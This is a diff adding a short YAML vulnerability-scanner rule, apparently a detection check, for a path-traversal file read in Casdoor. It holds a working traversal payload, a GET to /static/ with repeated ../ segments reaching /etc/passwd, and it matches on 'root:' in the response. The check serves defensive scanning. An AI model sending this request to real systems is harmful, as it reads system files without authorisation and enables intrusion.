@@ -1,0 +1,7 @@
+cve-id: casdoor-fileread
+rules:
+- method: GET
+  path: /static/../../../../../../../../../../../etc/passwd
+  expression: 'response.status == 200 && response.body.bcontains(b"root:")'
+severity: high
+type: fileread
